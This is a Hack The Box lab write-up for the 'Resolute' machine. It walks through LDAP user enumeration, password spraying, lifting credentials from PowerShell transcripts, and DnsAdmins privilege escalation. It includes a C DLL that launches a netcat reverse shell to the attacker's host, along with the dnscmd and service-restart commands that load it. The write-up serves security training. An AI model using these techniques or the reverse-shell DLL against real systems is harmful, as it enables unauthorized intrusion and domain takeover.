---
layout: single
title: Resolute - Hack The Box
excerpt: "We start Resolute with enumeration of the domain user accounts using an anonymous bind session to the LDAP server and find an initial password in the description field of one of the account. Password spraying the password against all the discovered accounts give us an initial shell then we pivot to another user after finding creds in a console history file. The priv esc is pretty cool: we're in the DNS admins group so we can reconfigure the DNS service to run an arbitrary DLL as SYSTEM."
date: 2020-05-30
classes: wide
header:
  teaser: /assets/images/htb-writeup-resolute/resolute_logo.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
  - infosec
tags:
  - rid cycling
  - password spray
  - creds in plaintext
  - bloodhound
  - dns
---

![](/assets/images/htb-writeup-resolute/resolute_logo.png)

We start Resolute with enumeration of the domain user accounts using an anonymous bind session to the LDAP server and find an initial password in the description field of one of the account. Password spraying the password against all the discovered accounts give us an initial shell then we pivot to another user after finding creds in a console history file. The priv esc is pretty cool: we're in the DNS admins group so we can reconfigure the DNS service to run an arbitrary DLL as SYSTEM.

## Summary

- We can enumerate the AD users using LDAP or RID cycling with enum4linux
- There's a default credential in one of the LDAP field for a user
- By password spraying this password across all discovered user accounts, we gain access as user melanie
- The credentials for the ryan user are found in the powershell history file
- User ryan is part of the DNS Admins group and we can replace the DNS service with a dll of our choosing
- By controlling the dll, we have RCE as SYSTEM since the DNS service runs as SYSTEM

## Tools/Blogs used

- [windapsearch](https://github.com/ropnop/windapsearch)
- [BloodHound.py](https://github.com/fox-it/BloodHound.py)
- [From DnsAdmins to SYSTEM to Domain Compromise](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-dnsadmins-to-system-to-domain-compromise)

## Fails

- Tried to create and modify DNS records once I had access to user Ryan, thinking it was a similar priv esc path than another lab on HTB
- Not keeping a "ready-to-go" DLL file handy. I had one on my previous Kali VM but didn't copy it over so I wasted precious time building a new one.

## Recon - Portscan

```
root@beholder:~/htb/resolute# nmap -p- 10.10.10.169
Starting Nmap 7.80 ( https://nmap.org ) at 2019-12-07 14:03 EST
Nmap scan report for resolute.htb (10.10.10.169)
Host is up (0.025s latency).
Not shown: 65512 closed ports
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49671/tcp open  unknown
49676/tcp open  unknown
49677/tcp open  unknown
49688/tcp open  unknown
49776/tcp open  unknown
```

## Recon - Enumerating users

Anonymous bind is allowed on the DC so I can use `windapsearch` to quickly get a list of all users on the system. This tool saves me the trouble of remembering the exact ldapsearch syntax (which I forget every single time).

```
root@beholder:~# windapsearch.py --dc-ip 10.10.10.169 -U
[+] No username provided. Will try anonymous bind.
[+] Using Domain Controller at: 10.10.10.169
[+] Getting defaultNamingContext from Root DSE
[+]	Found: DC=megabank,DC=local
[+] Attempting bind
[+]	...success! Binded as: 
[+]	 None

[+] Enumerating all AD users
[+]	Found 25 users: 

cn: Guest

cn: DefaultAccount

cn: Ryan Bertrand
userPrincipalName: ryan@megabank.local

cn: Marko Novak
userPrincipalName: marko@megabank.local

cn: Sunita Rahman
userPrincipalName: sunita@megabank.local

cn: Abigail Jeffers
userPrincipalName: abigail@megabank.local

cn: Marcus Strong
userPrincipalName: marcus@megabank.local

cn: Sally May
userPrincipalName: sally@megabank.local

cn: Fred Carr
userPrincipalName: fred@megabank.local

cn: Angela Perkins
userPrincipalName: angela@megabank.local

cn: Felicia Carter
userPrincipalName: felicia@megabank.local

cn: Gustavo Pallieros
userPrincipalName: gustavo@megabank.local

cn: Ulf Berg
userPrincipalName: ulf@megabank.local

cn: Stevie Gerrard
userPrincipalName: stevie@megabank.local

cn: Claire Norman
userPrincipalName: claire@megabank.local

cn: Paulo Alcobia
userPrincipalName: paulo@megabank.local

cn: Steve Rider
userPrincipalName: steve@megabank.local

cn: Annette Nilsson
userPrincipalName: annette@megabank.local

cn: Annika Larson
userPrincipalName: annika@megabank.local

cn: Per Olsson
userPrincipalName: per@megabank.local

cn: Claude Segal
userPrincipalName: claude@megabank.local

cn: Melanie Purkis
userPrincipalName: melanie@megabank.local

cn: Zach Armstrong
userPrincipalName: zach@megabank.local

cn: Simon Faraday
userPrincipalName: simon@megabank.local

cn: Naoki Yamamoto
userPrincipalName: naoki@megabank.local

[*] Bye!
```

I did another search in the LDAP directory but this time looking at the description because sometimes we can find additonial useful information in there. Here I see that the `marko` user has a note about the password being set to `Welcome123!`

```
root@beholder:~# windapsearch.py --dc-ip 10.10.10.169 --attrs sAMAccountName,description -U
[+] No username provided. Will try anonymous bind.
[+] Using Domain Controller at: 10.10.10.169
[+] Getting defaultNamingContext from Root DSE
[+]	Found: DC=megabank,DC=local
[+] Attempting bind
[+]	...success! Binded as: 
[+]	 None

[+] Enumerating all AD users
[+]	Found 25 users: 

[...]
description: Account created. Password set to Welcome123!
sAMAccountName: marko
[...]
```

## Password spraying - Access to user Melanie

The credentials `marko / Welcome123!` don't work with either SMB or WinRM:

```
root@beholder:~# evil-winrm -u marko -p Welcome123! -i 10.10.10.169
Evil-WinRM shell v2.0
Info: Establishing connection to remote endpoint
Error: An error of type WinRM::WinRMAuthorizationError happened, message is WinRM::WinRMAuthorizationError

root@beholder:~# smbmap -u marko -p Welcome123! -H 10.10.10.169
[+] Finding open SMB ports....
[!] Authentication error on 10.10.10.169
```

The password could be used by another account on the system so I'll use crackmapexec to try that password across all the accounts. I'll save my list of users to `users.txt` and use it with CME.

```
root@beholder:~/htb/resolute# crackmapexec smb 10.10.10.169 -u users.txt -p Welcome123!
SMB         10.10.10.169    445    RESOLUTE         [*] Windows Server 2016 Standard 14393 x64 (name:RESOLUTE) (domain:MEGABANK) (signing:True) (SMBv1:True)
[...]
SMB         10.10.10.169    445    RESOLUTE         [+] MEGABANK\melanie:Welcome123!
```

Bingo, we got the password for Melanie's account.

```
root@beholder:~/htb/resolute# evil-winrm -u melanie -p Welcome123! -i 10.10.10.169

Evil-WinRM shell v2.0

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\melanie\Documents> type ..\desktop\user.txt
0c3be45f[...]
```

## Powershell transcripts - Getting access as user ryan

Looking around the filesystem, I found the Powershell transcripts in the `C:\pstranscripts\20191203` directory. They contain a `net use` command that `ryan` used to mount a remote file share. Unfortunately for him, he specified the credentials in the command so I can see them in plaintext in the transcript file: `ryan / Serv3r4Admin4cc123!`

```
*Evil-WinRM* PS C:\pstranscripts\20191203> type PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt
**********************
Windows PowerShell transcript start
Start time: 20191203063201
Username: MEGABANK\ryan
RunAs User: MEGABANK\ryan
[...]
**********************
Command start time: 20191203063515
**********************
PS>CommandInvocation(Invoke-Expression): "Invoke-Expression"
>> ParameterBinding(Invoke-Expression): name="Command"; value="cmd /c net use X: \\fs01\backups ryan Serv3r4Admin4cc123!
```

After getting access to the `ryan` user account, I found a note in his desktop folder talking about changes automatically being reverted.

```
root@beholder:~/htb/resolute# evil-winrm -u ryan -p Serv3r4Admin4cc123! -i 10.10.10.169
Evil-WinRM shell v2.0
Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\ryan\Documents> dir ../desktop
    Directory: C:\Users\ryan\desktop

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        12/3/2019   7:34 AM            155 note.txt

*Evil-WinRM* PS C:\Users\ryan\Documents> type ../desktop/note.txt
Email to team:

- due to change freeze, any system changes (apart from those to the administrator account) will be automatically reverted within 1 minute
```

## Privesc using the DNS service

Our `ryan` user is part of the `Contractors` domain group.

```
*Evil-WinRM* PS C:\Users\ryan\Documents> net user ryan
User name                    ryan
Full Name                    Ryan Bertrand
[...]
Local Group Memberships      
Global Group memberships     *Domain Users         *Contractors          
The command completed successfully.
```

I used the python BloodHound ingestor to dump the info in BloodHound and see if I could pick up anything interesting to exploit.

```
root@beholder:~/opt/BloodHound.py# ./bloodhound.py -c all -u ryan -p Serv3r4Admin4cc123! --dns-tcp -d megabank.local -dc megabank.local -gc megabank.local -ns 10.10.10.169
INFO: Found AD domain: megabank.local
INFO: Connecting to LDAP server: megabank.local
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 2 computers
INFO: Connecting to LDAP server: megabank.local
INFO: Found 27 users
INFO: Found 50 groups
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: MS02.megabank.local
INFO: Querying computer: Resolute.megabank.local
INFO: Done in 00M 03S
```

![](/assets/images/htb-writeup-resolute/bloodhound.png)

As I suspected, user `ryan` is a member of two additional groups: `Remote Management Users` and `DnsAdmin`. I remember reading about a potential privilege escalation vector for users with `DnsAdmin` group access.

Spotless has a great [blog post](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-dnsadmins-to-system-to-domain-compromise) that covers this priv esc. In a nutshell, we can ask the machine to load an arbitrary DLL file when the service starts so that gives us RCE as SYSTEM. Because we're in the `DnsAdmins` group, we can re-configure the service and we have the required privileges to restart it.

Here's a quick DLL file that just calls netcat to get a reverse shell.

```c
#include "stdafx.h"
#include <stdlib.h>

BOOL APIENTRY DllMain(HMODULE hModule,
	DWORD  ul_reason_for_call,
	LPVOID lpReserved
)
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
		system("c:\\windows\\system32\\spool\\drivers\\color\\nc.exe -e cmd.exe 10.10.14.51 5555");
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}
```

After compiling this, I upload both the DLL and netcat to the machine.

```
*Evil-WinRM* PS C:\windows\system32\spool\drivers\color> upload /root/htb/resolute/nc.exe
Info: Uploading /root/htb/resolute/nc.exe to C:\windows\system32\spool\drivers\color\nc.exe

Data: 53248 bytes of 53248 bytes copied

Info: Upload successful!

*Evil-WinRM* PS C:\windows\system32\spool\drivers\color> upload /root/htb/resolute/pwn.dll
Info: Uploading /root/htb/resolute/pwn.dll to C:\windows\system32\spool\drivers\color\pwn.dll

Data: 305604 bytes of 305604 bytes copied

Info: Upload successful!
```

Next, I'll reconfigure the dns service and restart it.

```
*Evil-WinRM* PS C:\windows\system32\spool\drivers\color> cmd /c 'dnscmd RESOLUTE /config /serverlevelplugindll C:\Windows\System32\spool\drivers\color\pwn.dll'

Registry property serverlevelplugindll successfully reset.
Command completed successfully.

*Evil-WinRM* PS C:\windows\system32\spool\drivers\color> cmd /c "sc stop dns"

SERVICE_NAME: dns 
        TYPE               : 10  WIN32_OWN_PROCESS  
        STATE              : 3  STOP_PENDING 
                                (STOPPABLE, PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0
*Evil-WinRM* PS C:\windows\system32\spool\drivers\color> cmd /c "sc start dns"

SERVICE_NAME: dns 
        TYPE               : 10  WIN32_OWN_PROCESS  
        STATE              : 2  START_PENDING 
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x7d0
        PID                : 3500
        FLAGS
```

This triggers the DLL and I get a reverse shell as SYSTEM:

```
root@beholder:~/htb/resolute# rlwrap nc -lvnp 5555
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::5555
Ncat: Listening on 0.0.0.0:5555
Ncat: Connection from 10.10.10.169.
Ncat: Connection from 10.10.10.169:56778.
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
nt authority\system

C:\Windows\system32>type c:\users\administrator\desktop\root.txt
e1d9487[...]
```